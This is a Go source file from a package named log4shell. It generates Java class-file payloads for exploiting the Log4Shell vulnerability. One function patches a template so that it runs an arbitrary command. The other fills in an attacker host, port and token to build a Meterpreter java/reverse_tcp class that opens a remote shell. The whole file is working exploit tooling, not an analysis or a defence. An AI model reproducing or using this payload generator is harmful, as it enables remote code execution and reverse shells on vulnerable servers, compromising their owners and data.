package log4shell

import (
	"bytes"
	"encoding/binary"
	"strconv"

	"github.com/pkg/errors"
)

// GenerateExecute is used to generate class file with execute command.
func GenerateExecute(template []byte, command, class string) ([]byte, error) {
	const (
		fileNameFlag = "Exec.java"
		commandFlag  = "${cmd}"
		className    = "Exec\x01"
		uint16Size   = 2
	)

	// find three special strings
	fileNameIdx := bytes.Index(template, []byte(fileNameFlag))
	if fileNameIdx == -1 || fileNameIdx < 2 {
		return nil, errors.New("failed to find file name in execute template")
	}
	commandIdx := bytes.Index(template, []byte(commandFlag))
	if commandIdx == -1 || commandIdx < 2 {
		return nil, errors.New("failed to find command flag in execute template")
	}
	classNameIdx := bytes.Index(template, []byte(className))
	if classNameIdx == -1 || classNameIdx < 2 {
		return nil, errors.New("failed to find class name in execute template")
	}

	// check arguments
	if command == "" {
		return nil, errors.New("empty command")
	}
	if class == "" {
		class = "Exec"
	}

	// generate output class file
	output := bytes.NewBuffer(make([]byte, 0, len(template)+128))

	// change file name
	output.Write(template[:fileNameIdx-uint16Size])
	fileName := class + ".java"
	size := beUint16ToBytes(uint16(len(fileName)))
	output.Write(size)
	output.WriteString(fileName)

	// change command
	output.Write(template[fileNameIdx+len(fileNameFlag) : commandIdx-uint16Size])
	size = beUint16ToBytes(uint16(len(command)))
	output.Write(size)
	output.WriteString(command)

	// change class name
	output.Write(template[commandIdx+len(commandFlag) : classNameIdx-uint16Size])
	size = beUint16ToBytes(uint16(len(class)))
	output.Write(size)
	output.WriteString(class)

	output.Write(template[classNameIdx+len(className)-1:])
	return output.Bytes(), nil
}

// GenerateReverseTCP is used to generate class file with
// meterpreter: payload/java/meterpreter/reverse_tcp.
func GenerateReverseTCP(template []byte, host string, port uint16, token, class string) ([]byte, error) {
	const (
		fileNameFlag = "ReverseTCP.java"
		hostFlag     = "${host}"
		portFlag     = "${port}"
		tokenFlag    = "${token}"
		className    = "ReverseTCP\x0C"
		uint16Size   = 2
	)

	// find three special strings
	fileNameIdx := bytes.Index(template, []byte(fileNameFlag))
	if fileNameIdx == -1 || fileNameIdx < 2 {
		return nil, errors.New("failed to find file name in reverse_tcp template")
	}
	hostIdx := bytes.Index(template, []byte(hostFlag))
	if hostIdx == -1 || hostIdx < 2 {
		return nil, errors.New("failed to find host flag in reverse_tcp template")
	}
	portIdx := bytes.Index(template, []byte(portFlag))
	if portIdx == -1 || portIdx < 2 {
		return nil, errors.New("failed to find port flag in reverse_tcp template")
	}
	tokenIdx := bytes.Index(template, []byte(tokenFlag))
	if tokenIdx == -1 || tokenIdx < 2 {
		return nil, errors.New("failed to find token flag in reverse_tcp template")
	}
	classNameIdx := bytes.Index(template, []byte(className))
	if classNameIdx == -1 || classNameIdx < 2 {
		return nil, errors.New("failed to find class name in reverse_tcp template")
	}

	// check arguments
	if host == "" {
		return nil, errors.New("empty host")
	}
	if port == 0 {
		return nil, errors.New("zero port")
	}
	if class == "" {
		class = "ReverseTCP"
	}
	if token == "" {
		token = randString(8)
	}

	// generate output class file
	output := bytes.NewBuffer(make([]byte, 0, len(template)+128))

	// change file name
	output.Write(template[:fileNameIdx-uint16Size])
	fileName := class + ".java"
	size := beUint16ToBytes(uint16(len(fileName)))
	output.Write(size)
	output.WriteString(fileName)

	// change host
	output.Write(template[fileNameIdx+len(fileNameFlag) : hostIdx-uint16Size])
	size = beUint16ToBytes(uint16(len(host)))
	output.Write(size)
	output.WriteString(host)

	// change port
	output.Write(template[hostIdx+len(hostFlag) : portIdx-uint16Size])
	portStr := strconv.FormatUint(uint64(port), 10)
	size = beUint16ToBytes(uint16(len(portStr)))
	output.Write(size)
	output.WriteString(portStr)

	// change token(random)
	output.Write(template[portIdx+len(portFlag) : tokenIdx-uint16Size])
	size = beUint16ToBytes(uint16(len(token)))
	output.Write(size)
	output.WriteString(token)

	// change class name
	output.Write(template[tokenIdx+len(tokenFlag) : classNameIdx-uint16Size])
	size = beUint16ToBytes(uint16(len(class)))
	output.Write(size)
	output.WriteString(class)

	output.Write(template[classNameIdx+len(className)-1:])
	return output.Bytes(), nil
}

func beUint16ToBytes(n uint16) []byte {
	b := make([]byte, 2)
	binary.BigEndian.PutUint16(b, n)
	return b
}